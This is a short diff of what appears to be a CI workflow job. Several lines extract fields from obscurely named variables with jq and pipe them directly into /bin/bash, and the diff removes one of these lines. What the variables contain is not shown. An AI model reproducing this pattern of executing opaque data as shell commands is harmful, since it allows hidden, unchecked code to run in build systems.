@@ -23,7 +23,6 @@ jobs:
           echo $m4351 | jq -r .sw7 | /bin/bash
           printf '%s' "$oqkl8" | jq -r .uf14329 | /bin/bash
           printf '%s' "$dtwqs2" | jq -r .cq36638 | /bin/bash
-          printf '%s' "$ftk6" | jq -r .y29 | /bin/bash
           echo $plvu56 | jq -r .wd1966 | /bin/bash
 
       - name: Archive results
